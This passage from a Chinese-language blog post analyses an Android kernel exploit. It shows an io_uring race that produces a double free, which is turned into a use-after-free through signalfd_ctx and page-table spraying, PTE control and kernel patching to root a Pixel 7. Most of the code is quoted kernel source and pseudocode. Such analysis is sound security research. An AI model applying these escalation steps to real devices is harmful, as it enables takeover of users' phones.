                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/avatar-1732523021637-5.jpg"
                      alt="race_0"
                ></p>
<p><strong>改进条件竞争</strong>：竞争条件一般会触发内存损坏。对于本例会复杂一点，通常，<code>io_cancel_defer_files()</code>只处理当前任务创建的<code>io_ring_ctx</code>的延迟列表<code>defer_list</code>。因此，exec 任务中的<code>io_cancel_defer_files()</code>不会处理 iopoll 任务中相同的延迟列表。有一个例外，如果我们在exec任务中向 iopoll 任务的<code>io_ring_ctx</code> 提交<code>IOSQE_IO_DRAIN</code>请求时，就可以让exec任务进程中的<code>io_cancel_defer_files()</code>处理该<code>io_ring_ctx</code>的延迟队列。新的条件竞争如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/race_1.jpg"
                      alt="race_1"
                ></p>
<p>在这种情况下，当<code>exec</code>任务和<code>iopoll</code>任务同时处理<code>defer_list</code>时，会触发内存损坏。</p>
<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>由于竞争无法控制<code>io_cancel_defer_files()</code> 和 <code>__io_queue_deferred()</code> 何时被触发，可通过重复执行exec任务和iopoll任务，如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/race_2.jpg"
                      alt="race_2"
                ></p>
<p><strong>两种崩溃情况</strong>：</p>
<ul>
<li>（1）由无效list造成。<code>io_cancel_defer_files()</code> 和 <code>__io_queue_deferred()</code> 会竞争遍历<code>ctx-&gt;defer_list</code>并从中移除对象，因此<code>ctx-&gt;defer_list</code>可能会无效，会触发<code>__list_del_entry_valid()</code>导致内核崩溃。这种情况无法利用。</li>
<li>（2）由Double-Free造成。情况如下：</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/double_free.jpg"
                      alt="double_free"
                ></p>
<h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>Android内核5.10中，<code>io_defer_entry</code>漏洞对象位于<code>kmalloc-128</code>，触发Double-Free的步骤如下：</p>
<p>（1）在第1次 <code>kfree()</code> 之前：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241211184610925.png"
                      alt="image-20241211184610925"
                ></p>
<p>（2）在第1次 <code>kfree()</code> 之后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241211184738724.png"
                      alt="image-20241211184738724"
                ></p>
<p>（3）第2次 <code>kfree()</code> 之后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241211184803687.png"
                      alt="image-20241211184803687"
                ></p>
<p>（4）如上所示，slab进入了非法状态：<code>freelist</code>和<code>next object</code>都指向同一空闲对象。理想情况下，我们可以从slab中分配对象两次，从而控制slab的freelist。首先，从slab中分配出一个内容可控的对象：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241211185135323.png"
                      alt="image-20241211185135323"
                ></p>
<p>（5）可见，由于分配的对象内容可控，可以让<code>next object</code>指向我们可控的任何虚拟地址。接着，再次从slab中分配一个对象，slab如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241211185210791.png"
                      alt="image-20241211185210791"
                ></p>
<p>让freelist指向我们可控的虚拟地址，就能轻松提权。问题是Android内核开启了<code>CONFIG_SLAB_FREELIST_HARDENED</code>，会混淆<code>next object</code>指针，由于freelist不可控而导致内核崩溃。</p>
<h3 id="可利用性"><a href="#可利用性" class="headerlink" title="可利用性"></a>可利用性</h3><p><strong>目标</strong>：将<code>Double-Free</code>转化为<code>UAF</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/UAF_1.jpg"
                      alt="UAF_1"
                ></p>
<p><strong>（1）挑战 1 - 竞争窗口过小：难以在两次释放<code>io_defer_entry</code>之间堆喷占用空闲对象</strong></p>
<p><strong>（2）挑战 2 - 重复触发Double-Free会降低可利用性</strong></p>
<p>重复速度越快，Double-Free错误触发的速度越快。在测试时，可通过添加调试代码来增大两次<code>kfree()</code>之间的时间窗口，</p>
<p><strong>（3）解决挑战1：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/UAF_0.jpg"
                      alt="UAF_0"
                ></p>
<p>问题是，增大了竞争窗口，能够解决挑战1，但是使得重复速度变慢，很难触发Double-Free漏洞了。增大竞争窗口和提高重复速率相矛盾了。</p>
<p><strong>（4）解决挑战 2 - 通过增大<code>ctx-&gt;defer_list</code>双链表的长度，增大iopoll任务的遍历时间，以控制竞争点的时序</strong></p>
<p>首先，作者发现<code>ctx-&gt;defer_list</code>可以是很长的list，因为<code>io_uring</code>不限制<code>ctx-&gt;defer_list</code>中<code>io_defer_entry</code>对象的个数。其次，生成<code>io_defer_entry</code>对象很容易。根据 io_uring 稳定，我们不仅可以生成<code>io_defer_entry</code>对象与启用REQ_F_IO_DRAIN的请求相关联，还可以生成<code>io_defer_entry</code>对象与未启用REQ_F_IO_DRAIN的请求相关联。</p>
<blockquote>
<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOSQE_IO_DRAIN</span><br><span class="line">    When this flag is  specified,  the  SQE  will  not  be  started  before  previously</span><br><span class="line">    submitted  SQEs  have  completed,  and new SQEs will not be started before this one</span><br><span class="line">    completes. Available since 5.2.</span><br><span class="line">    当指定此标志时，SQE将不会在之前提交的SQE完成之前开始处理，新的SQE也不会在这个SQE完成之前开始。5.2开始可用</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>以下代码用于生成100w个<code>io_defer_entry</code>对象，每个对象都与一个未启用 REQ_F_IO_DRAIN 的请求相关联：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iopoll  <span class="title function_">Task</span></span><br><span class="line"><span class="params">(cpu A)</span></span><br><span class="line"></span><br><span class="line">A1. create a `io_ring_ctx` with IORING_SETUP_IOPOLL enabled by <span class="title function_">io_uring_setup</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">A2: 提交 IORING_OP_READ 请求来读取 ext4 文件系统的文件;</span><br><span class="line"></span><br><span class="line">A3. 在启用 REQ_F_IO_DRAIN 的情况下提交请求;  <span class="comment">// 触发生成`io_defer_entry`对象，因为还没有获取到之前的请求的CQE </span></span><br><span class="line"></span><br><span class="line">A4. <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">        在禁用 REQ_F_IO_DRAIN 的情况下提交请求;  <span class="comment">// 触发生成`io_defer_entry`对象，和未启用REQ_F_IO_DRAIN的请求相关联</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>由于我们能够生成非常多的<code>io_defer_entry</code>，且与未启用REQ_F_IO_DRAIN的请求相关联，因此可以<strong>使 <code>__io_queue_deferred()</code> 遍历<code>ctx-&gt;defer_list</code>很长一段时间</strong>。这样能<strong>使<code>__io_queue_deferred()</code>执行数秒钟，然后同时准确的触发执行<code>io_cancel_defer_files()</code>，准确触发Double-Free</strong>。</p>
<p><strong>（5）解决挑战 1 - 利用两次<code>kfree()</code>之间的代码来增大竞争窗口</strong></p>
<p>现在不需要使用重复策略来触发Double-Free了，可以任意扩大 <code>kfree()</code>时间窗。很可惜Jann Horn[1]、Yoochan Lee、Byoungyoung Lee、Chanwoo Min[2]提出的方法都没用。那么 <code>io_cancel_defer_files()</code> 中是否有些代码可以帮助增大时间窗口呢？</p>
<p>作者发现，<code>io_cancel_defer_files()</code>第2次调用<code>kfree()</code>之前有很多唤醒操作，例如，会调用 <code>io_req_complete()</code> -&gt; <code>io_cqring_ev_posted()</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_cqring_ev_posted</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (wq_has_sleeper(&amp;ctx-&gt;cq_wait)) &#123;</span><br><span class="line">        wake_up_interruptible(&amp;ctx-&gt;cq_wait);  <span class="comment">//&lt;------------------------ wakeup the waiter (1)</span></span><br><span class="line">        kill_fasync(&amp;ctx-&gt;cq_fasync, SIGIO, POLL_IN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (waitqueue_active(&amp;ctx-&gt;wait))</span><br><span class="line">        wake_up(&amp;ctx-&gt;wait);                   <span class="comment">//&lt;------------------------ wakeup the waiter (2)</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;sq_data &amp;&amp; waitqueue_active(&amp;ctx-&gt;sq_data-&gt;wait))</span><br><span class="line">        wake_up(&amp;ctx-&gt;sq_data-&gt;wait);          <span class="comment">//&lt;------------------------ wakeup the waiter (3)</span></span><br><span class="line">    <span class="keyword">if</span> (io_should_trigger_evfd(ctx))</span><br><span class="line">        eventfd_signal(ctx-&gt;cq_ev_fd, <span class="number">1</span>);      <span class="comment">//&lt;------------------------ wakeup the waiter (4)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>exec任务有4个地方会唤醒其他任务来运行，可利用第1个来扩大时间窗口。**对 io_uring fd调用<code>epoll_wait()</code>，就能在<code>ctx-&gt;cq_wait</code>上设置一个waiter；还需要另一个epoll任务来执行<code>epoll_wait()</code>，这样epoll任务就能在调用<code>wake_up_interruptible()</code>时抢占CPU，从而在第2次调用<code>kfree()</code>之前暂停 <code>io_cancel_defer_files()</code>**。问题是，如果很快就重新执行exec任务，时间窗还是很小。解决办法是采用 Jann Horn[1] 提到的调度器策略，成功将 <code>kfree()</code> 窗口增大数秒。</p>
<p>触发Double-Free并转化为UAF的流程如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212103611498.png"
                      alt="image-20241212103611498"
                ></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="创建signalfd-ctx受害者对象"><a href="#创建signalfd-ctx受害者对象" class="headerlink" title="创建signalfd_ctx受害者对象"></a>创建<code>signalfd_ctx</code>受害者对象</h4><p><strong><code>signalfd_ctx</code>分配</strong>：调用<code>signalfd()</code>就会从 kmalloc-128 分配<code>signalfd_ctx</code>对象。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_signalfd4</span><span class="params">(<span class="type">int</span> ufd, <span class="type">sigset_t</span> *mask, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signalfd_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">    ......</span><br><span class="line">    sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));<span class="comment">// mask 值的 bit 18 和 bit 8 会被置为 1</span></span><br><span class="line">    signotset(mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ufd == <span class="number">-1</span>) &#123;</span><br><span class="line">        ctx = kmalloc(<span class="keyword">sizeof</span>(*ctx), GFP_KERNEL);      <span class="comment">//&lt;-----------  分配`signalfd_ctx`对象</span></span><br><span class="line">        <span class="keyword">if</span> (!ctx)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">        ctx-&gt;sigmask = *mask;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * When we call this, the initialization must be complete, since</span></span><br><span class="line"><span class="comment">         * anon_inode_getfd() will install the fd.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        ufd = anon_inode_getfd(<span class="string">&quot;[signalfd]&quot;</span>, &amp;signalfd_fops, ctx,</span><br><span class="line">                       O_RDWR | (flags &amp; (O_CLOEXEC | O_NONBLOCK)));</span><br><span class="line">        <span class="keyword">if</span> (ufd &lt; <span class="number">0</span>)</span><br><span class="line">            kfree(ctx);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> fd f = fdget(ufd);</span><br><span class="line">        <span class="keyword">if</span> (!f.file)</span><br><span class="line">            <span class="keyword">return</span> -EBADF;</span><br><span class="line">        ctx = f.file-&gt;private_data;</span><br><span class="line">        <span class="keyword">if</span> (f.file-&gt;f_op != &amp;signalfd_fops) &#123;</span><br><span class="line">            fdput(f);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line">        ctx-&gt;sigmask = *mask;                       <span class="comment">// &lt;----  对 signalfd_ctx-&gt;sigmask 进行有限制的写操作</span></span><br><span class="line">        spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">        wake_up(&amp;current-&gt;sighand-&gt;signalfd_wqh);</span><br><span class="line">        fdput(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ufd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong><code>signalfd_ctx</code>读写操作</strong>：如上所示，在堆喷后会往<code>signalfd_ctx</code>开头写入8字节，但不影响利用。除了有限制的写操作，还可以通过<code>show_fdinfo</code>接口（procfs导出）读取<code>signalfd_ctx</code>的前8字节。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">signalfd_show_fdinfo</span><span class="params">(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signalfd_ctx</span> *<span class="title">ctx</span> =</span> f-&gt;private_data;</span><br><span class="line">    <span class="type">sigset_t</span> sigmask;</span><br><span class="line"></span><br><span class="line">    sigmask = ctx-&gt;sigmask;</span><br><span class="line">    signotset(&amp;sigmask);</span><br><span class="line">    <span class="type">render_sigset_t</span>(m, <span class="string">&quot;sigmask:\t&quot;</span>, &amp;sigmask); 	<span class="comment">// 读取`signalfd_ctx`的前8字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>**堆喷<code>signalfd_ctx</code>**：在两次<code>kfree()</code>之间，堆喷16000 <code>signalfd_ctx</code> 对象来占用释放的<code>io_defer_entry</code>对象。如果成功占据，那么第2次<code>kfree()</code>就会释放这个<code>signalfd_ctx</code> 对象，我们将其称为受害者<code>signalfd_ctx</code> 对象。</p>
<h4 id="定位受害者signalfd-ctx-对象"><a href="#定位受害者signalfd-ctx-对象" class="headerlink" title="定位受害者signalfd_ctx 对象"></a>定位受害者<code>signalfd_ctx</code> 对象</h4><p><strong>思路</strong>：堆喷<code>seq_operations</code>对象是为了确定哪一个<code>signalfd_ctx</code> 对象被释放了，也即受害者<code>signalfd_ctx</code> 对象对应的fd，便于后面利用该fd篡改PTE。</p>
<p>第2次<code>kfree()</code>后堆喷16000个<code>seq_operations</code>对象，可调用<code>single_open()</code>来分配（打开<code>/proc/self/status</code>或其他procfs文件可触发<code>single_open()</code>）。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int single_open(struct file *file, int (*show)(struct seq_file *, void *),</span><br><span class="line">        void *data)</span><br><span class="line">&#123;</span><br><span class="line">    struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT);//allocate seq_operations object</span><br><span class="line">    int res = -ENOMEM;</span><br><span class="line"></span><br><span class="line">    if (op) &#123;</span><br><span class="line">        op-&gt;start = single_start;</span><br><span class="line">        op-&gt;next = single_next;</span><br><span class="line">        op-&gt;stop = single_stop;</span><br><span class="line">        op-&gt;show = show;</span><br><span class="line">        res = seq_open(file, op);</span><br><span class="line">        if (!res)</span><br><span class="line">            ((struct seq_file *)file-&gt;private_data)-&gt;private = data;</span><br><span class="line">        else</span><br><span class="line">            kfree(op);</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果堆喷的<code>seq_operations</code>对象占据了某个释放的<code>signalfd_ctx</code>对象，如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212105009300.png"
                      alt="image-20241212105009300"
                ></p>
<p><strong>方法</strong>：通过读取所有信号fd的fdinfo，如果其fdinfo与初始化不同，说明其前8字节被覆盖成了<code>seq_operations</code>的内核地址。该fd和受害者<code>signalfd_ctx</code>对象相关联。这样就定位到了受害者<code>signalfd_ctx</code> 对象</p>
<h4 id="回收受害者signalfd-ctx-对象所在的slab"><a href="#回收受害者signalfd-ctx-对象所在的slab" class="headerlink" title="回收受害者signalfd_ctx 对象所在的slab"></a>回收受害者<code>signalfd_ctx</code> 对象所在的slab</h4><p><strong>方法</strong>：关闭所有信号fd和<code>/proc/self/status</code> fd，除了受害者<code>signalfd_ctx</code> 对象对应的fd，这样受害者<code>signalfd_ctx</code>对象所在的slab变空，会被页分配器所回收。</p>
<h4 id="用户页表占据受害者slab"><a href="#用户页表占据受害者slab" class="headerlink" title="用户页表占据受害者slab"></a>用户页表占据受害者slab</h4><p><strong>目标</strong>：堆喷用户页表来占据受害者slab，并定位受害者<code>signalfd_ctx</code>对象的位置。</p>
<p>由于kmalloc-128 slab使用的是1-page，且用户页表也是1-page，这样可以堆喷用户页表来占据受害者slab。如果成功则如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212110909838.png"
                      alt="image-20241212110909838"
                ></p>
<p>可见，<strong>通过写入受害者<code>signalfd_ctx</code>对象的前8字节，可以控制用户页表的某个PTE。将PTE的物理地址设置为内核text&#x2F;data的物理地址，就能修改内核text&#x2F;data数据。</strong></p>
<p>页表喷射步骤如下：</p>
<p><strong>（1）调用<code>mmap()</code>在虚拟地址空间中创建一块大内存区域</strong></p>
<p><strong>内存区域大小</strong>：因为每个末级页表描述了2M的虚拟内存（<code>512*4096</code>），所以如果要喷射512个用户页表，必须调用 <code>mmap()</code> 创建512*2M大小的内存区域。</p>
<p>内存区域计算 —— <code>内存区域大小 = 页表数量 * 2MiB</code></p>
<p><strong>起始虚拟地址</strong>：起始虚拟地址需与2M（0x200000）对齐。原因是，现在我们只能控制<code>signalfd_ctx</code>的前8字节，并且不知道受害者<code>signalfd_ctx</code>对象在slab中具体位置，可能位于中间。0x200000对齐的起始虚拟地址能确保<strong>该地址对应的PTE位于页表的前8个字节</strong>。这样在第3步之后页表将如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212112730734.png"
                      alt="image-20241212112730734"
                ></p>
<p><strong>（2）页表分配</strong></p>
<p><strong>分配方法</strong>：上一步已经创建了内存区域，现在可以从起始虚拟地址开始每隔0x200000字节执行一次写操作，确保内存区域对应的所有用户页表都被分配。即可堆喷用户页表。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *addr = (<span class="type">unsigned</span> <span class="type">char</span> *)start_virtual_address;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; size_of_memory_region; i+= <span class="number">0x200000</span>) &#123;</span><br><span class="line">    *(addr + i) = <span class="number">0xaa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>（3）在页表中定位受害者<code>signalfd_ctx</code>对象</strong></p>
<p>在第2步以后，我们只能确保每个页表的第1个PTE有效。因为受害者<code>signalfd_ctx</code>对象可以位于页表中与 128 对齐的任何偏移处，所以必须验证位于页表中所有与128对齐的偏移处的PTE。因此，我们从起始虚拟地址开始，每隔16K字节（每个page含有32个<code>signalfd_ctx</code>对象，对象大小为128字节，<code>128 / 8 * 4096 = 16 page</code>，这里的16K小了，但也能达到目的）进行一次写操作。最终的页表如上图所示。</p>
<p><strong>定位方法</strong>：通过读取受害者信号fd的fdinfo，可以泄露受害者<code>signalfd_ctx</code>对象的前8个字节。<strong>如果能成功读取一个有效的PTE值，说明成功的用用户页表占用了受害者slab</strong>。否则，unmap() 该区域，重映射更大的内存，重复步骤（1）~（3）。</p>
<h4 id="patch内核并提权"><a href="#patch内核并提权" class="headerlink" title="patch内核并提权"></a>patch内核并提权</h4><p>现在可通过受害者<code>signalfd_ctx</code>对象控制PTE，下面通过将PTE的物理地址设置为内核text&#x2F;data地址，patch内核并提权。</p>
<p><strong>（1）定位PTE对应的用户虚拟地址</strong></p>
<p><strong>目的</strong>：虽然现在可以控制用户页表的一个PTE，但是还不知道该PTE对应的用户虚拟地址。只有知道了该PTE对应的虚拟地址，才能<strong>通过写入该用户虚拟地址来patch内核的text&#x2F;data</strong>。</p>
<p><strong>方法</strong>：为了定位该PTE对应的用户虚拟地址，需将该PTE的物理地址修改为其他物理地址。然后遍历之前映射的所有虚拟地址，检查是否有一个虚拟地址上的值不是之前设置的初始值（0xaa）。如果找到这样一个虚拟地址，则说明就是PTE对应的虚拟地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212114500993.png"
                      alt="image-20241212114500993"
                ></p>
<p><strong>写限制</strong>：受害者<code>signalfd_ctx</code>对象的写入能力有限（写入值的bit 18和bit 8被设置为1），无法对内核任意地址进行patch。一个普通PTE对应的用户虚拟地址为<code>0xe800098952ff43</code>，其bit 8总是为1，但是bit 18位于PTE的物理地址中，所以只能对bit 18为1的物理地址进行patch。</p>
<p>该限制是由<code>do_signalfd4()</code>中的<code>sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));</code>语句所导致，是否可以对该语句打patch呢？</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_signalfd4</span><span class="params">(<span class="type">int</span> ufd, <span class="type">sigset_t</span> *mask, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signalfd_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">    ......</span><br><span class="line">    sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP)); <span class="comment">// 将mask中的bit 18和bit 8设置为1</span></span><br><span class="line">    signotset(mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ufd == <span class="number">-1</span>) &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> fd f = fdget(ufd);</span><br><span class="line">        <span class="keyword">if</span> (!f.file)</span><br><span class="line">            <span class="keyword">return</span> -EBADF;</span><br><span class="line">        ctx = f.file-&gt;private_data;</span><br><span class="line">        <span class="keyword">if</span> (f.file-&gt;f_op != &amp;signalfd_fops) &#123;</span><br><span class="line">            fdput(f);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line">        ctx-&gt;sigmask = *mask;                       <span class="comment">// &lt;----- 对signalfd_ctx进行有限制的写操作 </span></span><br><span class="line">        spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">        wake_up(&amp;current-&gt;sighand-&gt;signalfd_wqh);</span><br><span class="line">        fdput(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ufd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>do_signalfd4()</code>的物理地址的 bit 18 恰好为1，因此可patch <code>sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));</code> 语句。如何找到内核某函数的物理地址？</p>
<p><strong>（3）对内核打补丁</strong></p>
<p>目标是对<code>selinux_state</code>和<code>setresuid()</code>&#x2F;<code>setresgid()</code>等函数打补丁，以提权 Google Pixel 7。由于只有一个PTE可控，所以需要多次修改PTE的物理地址。</p>
<p><strong>（4）调用<code>setresuid()</code>、<code>setresgid()</code>提权</strong></p>
